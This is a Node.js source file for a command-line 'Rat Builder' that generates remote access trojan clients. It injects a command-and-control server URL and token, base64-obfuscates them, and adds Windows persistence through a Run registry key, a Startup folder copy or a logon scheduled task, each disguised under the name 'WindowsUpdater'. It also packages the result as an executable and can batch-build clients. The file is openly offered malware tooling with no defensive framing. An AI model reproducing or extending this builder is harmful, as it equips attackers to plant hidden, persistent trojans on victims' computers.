#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');

class RatBuilder {
  constructor() {
    this.templates = new Map();
    this.config = {};
    this.outputDir = path.join(__dirname, 'output');
    this.templatesDir = path.join(__dirname, 'templates');
    this.ensureDirectories();
  }

  ensureDirectories() {
    [this.outputDir, this.templatesDir].forEach(dir => {
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
    });
  }

  loadTemplate(templateName) {
    const templatePath = path.join(this.templatesDir, `${templateName}.js`);
    if (!fs.existsSync(templatePath)) {
      throw new Error(`Template ${templateName} not found`);
    }
    return fs.readFileSync(templatePath, 'utf8');
  }

  generateClientId() {
    return `rat_${crypto.randomBytes(8).toString('hex')}`;
  }

  obfuscateString(str) {
    // Simple string obfuscation
    return Buffer.from(str).toString('base64');
  }

  buildClient(options = {}) {
    const {
      template = 'basic',
      serverUrl,
      authToken,
      clientId = this.generateClientId(),
      obfuscate = true,
      persistence = false,
      name = 'rat_client'
    } = options;

    if (!serverUrl || !authToken) {
      throw new Error('serverUrl and authToken are required');
    }

    // Load template
    let clientCode = this.loadTemplate(template);

    // Replace configuration placeholders
    const replacements = {
      '__SERVER_URL__': obfuscate ? this.obfuscateString(serverUrl) : serverUrl,
      '__AUTH_TOKEN__': obfuscate ? this.obfuscateString(authToken) : authToken,
      '__CLIENT_ID__': clientId,
      '__BUILD_TIME__': new Date().toISOString(),
      '__OBFUSCATE__': obfuscate.toString()
    };

    for (const [placeholder, value] of Object.entries(replacements)) {
      clientCode = clientCode.replace(new RegExp(placeholder, 'g'), value);
    }

    // Add persistence if requested
    if (persistence) {
      const persistenceCode = this.generatePersistenceCode(options.persistenceType);
      clientCode = clientCode.replace('// __PERSISTENCE_HOOK__', persistenceCode);
    }

    // Add obfuscation layer if requested
    if (obfuscate) {
      clientCode = this.wrapWithObfuscation(clientCode);
    }

    // Write output
    const outputPath = path.join(this.outputDir, `${name}.js`);
    fs.writeFileSync(outputPath, clientCode);

    // Generate executable if requested
    if (options.executable) {
      this.generateExecutable(outputPath, name, options.target);
    }

    return {
      path: outputPath,
      clientId: clientId,
      config: {
        serverUrl,
        template,
        obfuscate,
        persistence,
        buildTime: new Date().toISOString()
      }
    };
  }

  generatePersistenceCode(type = 'registry') {
    const persistenceMethods = {
      registry: `
        // Windows Registry persistence
        if (typeof require !== 'undefined') {
          try {
            const { execSync } = require('child_process');
            const path = process.execPath;
            execSync(\`reg add "HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run" /v "WindowsUpdater" /t REG_SZ /d "\${path}" /f\`, { silent: true });
          } catch (e) {
            console.log('Persistence setup failed');
          }
        }
      `,
      startup: `
        // Startup folder persistence
        if (typeof require !== 'undefined') {
          try {
            const fs = require('fs');
            const path = require('path');
            const os = require('os');
            const startupPath = path.join(os.homedir(), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
            const execPath = process.execPath;
            fs.copyFileSync(execPath, path.join(startupPath, 'WindowsUpdater.exe'));
          } catch (e) {
            console.log('Persistence setup failed');
          }
        }
      `,
      scheduled: `
        // Scheduled task persistence
        if (typeof require !== 'undefined') {
          try {
            const { execSync } = require('child_process');
            const path = process.execPath;
            execSync(\`schtasks /create /tn "WindowsUpdater" /tr "\${path}" /sc onlogon /f\`, { silent: true });
          } catch (e) {
            console.log('Persistence setup failed');
          }
        }
      `
    };

    return persistenceMethods[type] || '';
  }

  wrapWithObfuscation(code) {
    return `
      (function() {
        // Obfuscation layer
        const _decode = (str) => Buffer.from(str, 'base64').toString();
        const _config = {
          serverUrl: '__SERVER_URL__',
          authToken: '__AUTH_TOKEN__'
        };
        
        // Decode configuration
        _config.serverUrl = _decode(_config.serverUrl);
        _config.authToken = _decode(_config.authToken);
        
        // Execute main code
        ${code.replace(/__SERVER_URL__/g, '_config.serverUrl').replace(/__AUTH_TOKEN__/g, '_config.authToken')}
      })();
    `;
  }

  generateExecutable(jsPath, name, target = 'win') {
    try {
      // Using pkg to create executable
      const packageJson = {
        name: name,
        version: '1.0.0',
        main: jsPath,
        bin: jsPath,
        pkg: {
          targets: [target === 'win' ? 'node18-win-x64' : 'node18-linux-x64'],
          outputPath: this.outputDir
        }
      };

      const packagePath = path.join(this.outputDir, 'package.json');
      fs.writeFileSync(packagePath, JSON.stringify(packageJson, null, 2));

      // Install pkg and build
      execSync('npm install -g pkg', { stdio: 'inherit' });
      execSync(`pkg ${packagePath}`, { stdio: 'inherit' });

      console.log(`✅ Executable created: ${path.join(this.outputDir, name + '.exe')}`);
    } catch (error) {
      console.error('❌ Failed to create executable:', error.message);
    }
  }

  batchBuild(configurations) {
    const results = [];
    
    for (const config of configurations) {
      try {
        const result = this.buildClient(config);
        results.push({ success: true, ...result });
        console.log(`✅ Built client: ${result.clientId}`);
      } catch (error) {
        results.push({ success: false, error: error.message, config });
        console.error(`❌ Failed to build client:`, error.message);
      }
    }

    return results;
  }

  listTemplates() {
    const templates = fs.readdirSync(this.templatesDir)
      .filter(file => file.endsWith('.js'))
      .map(file => path.basename(file, '.js'));
    
    return templates;
  }
}

// CLI interface
if (require.main === module) {
  const builder = new RatBuilder();
  
  const args = process.argv.slice(2);
  const command = args[0];

  switch (command) {
    case 'build':
      const options = {
        serverUrl: args[1] || process.env.C2_SERVER_URL,
        authToken: args[2] || process.env.C2_AUTH_TOKEN,
        template: args[3] || 'basic',
        executable: args.includes('--exe'),
        persistence: args.includes('--persist'),
        name: args.find(arg => arg.startsWith('--name='))?.split('=')[1] || 'rat_client'
      };

      if (!options.serverUrl || !options.authToken) {
        console.error('❌ serverUrl and authToken are required');
        process.exit(1);
      }

      try {
        const result = builder.buildClient(options);
        console.log('✅ Client built successfully!');
        console.log(`📁 Path: ${result.path}`);
        console.log(`🆔 Client ID: ${result.clientId}`);
        console.log(`⚙️ Config:`, result.config);
      } catch (error) {
        console.error('❌ Build failed:', error.message);
        process.exit(1);
      }
      break;

    case 'templates':
      console.log('Available templates:');
      builder.listTemplates().forEach(template => {
        console.log(`  - ${template}`);
      });
      break;

    case 'batch':
      const configFile = args[1];
      if (!configFile) {
        console.error('❌ Configuration file required');
        process.exit(1);
      }

      try {
        const configs = JSON.parse(fs.readFileSync(configFile, 'utf8'));
        const results = builder.batchBuild(configs);
        console.log(`✅ Batch build complete: ${results.filter(r => r.success).length}/${results.length} successful`);
      } catch (error) {
        console.error('❌ Batch build failed:', error.message);
        process.exit(1);
      }
      break;

    default:
      console.log(`
Rat Builder - Command Line Interface

Usage:
  node index.js build <serverUrl> <authToken> [template] [options]
  node index.js templates
  node index.js batch <config.json>

Options:
  --exe              Generate executable
  --persist          Add persistence
  --name=<name>      Output name

Examples:
  node index.js build https://c2.example.com token123 basic --exe --persist
  node index.js batch configs.json
      `);
  }
}

module.exports = RatBuilder;
